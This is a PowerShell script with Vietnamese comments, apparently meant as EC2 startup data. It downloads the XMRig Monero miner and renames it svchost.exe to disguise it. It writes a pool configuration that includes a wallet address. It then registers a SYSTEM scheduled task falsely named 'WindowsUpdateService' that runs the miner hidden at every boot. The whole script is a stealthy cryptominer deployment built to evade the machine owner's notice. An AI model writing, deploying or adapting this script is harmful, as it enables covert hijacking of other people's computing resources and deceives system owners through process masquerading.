# Bật logging để debug
Start-Transcript -Path C:\Windows\Temp\setup.log -Append

# Lấy thông tin tên vùng của EC2
$region = (Invoke-RestMethod -Uri http://169.254.169.254/latest/meta-data/placement/region)

# Tạo thư mục làm việc
$workDir = "C:\Windows\Temp\xmrig"
New-Item -ItemType Directory -Path $workDir -Force | Out-Null
Set-Location -Path $workDir

# Tải và giải nén XMRig
$xmrigUrl = "https://github.com/kryptex-miners-org/kryptex-miners/releases/download/xmrig-6-22-2/xmrig-6.22.2-msvc-win64.zip"
Invoke-WebRequest -Uri $xmrigUrl -OutFile "$workDir\xmrig.zip"
Expand-Archive -Path "$workDir\xmrig.zip" -DestinationPath $workDir -Force
Remove-Item "$workDir\xmrig.zip"

# Đổi tên file để ẩn danh
Rename-Item -Path "$workDir\xmrig.exe" -NewName "svchost.exe"

# Cấu hình tệp config với tên Worker động
$xmrigConfig = @"
{
    "autosave": true,
    "cpu": true,
    "opencl": false,
    "cuda": false,
    "pools": [
        {
            "url": "xmr-eu.kryptex.network:7029",
            "user": "88NaRPxg9d16NwXYpMvXrLir1rqw9kMMbK6UZQSix59SiQtQZYdM1R4G8tmdsNvF1ZXTRAZsvEtLmQsoxWhYHrGYLzj6csV.Win",
            "keepalive": true,
            "tls": false
        }
    ]
}
"@
$xmrigConfig | Out-File -Encoding utf8 "$workDir\config.json"

# Ẩn tiến trình XMRig bằng cách đổi tên
$taskName = "WindowsUpdateService"
$exePath = "$workDir\svchost.exe"

# Tạo task tự động chạy khi khởi động
schtasks /Create /TN $taskName /SC ONSTART /RU SYSTEM /RL HIGHEST /TR "$exePath --config=$workDir\config.json" /F

# Chạy XMRig ngay lập tức
Start-Process -FilePath $exePath -ArgumentList "--config=$workDir\config.json" -WindowStyle Hidden

# Tắt logging
Stop-Transcript
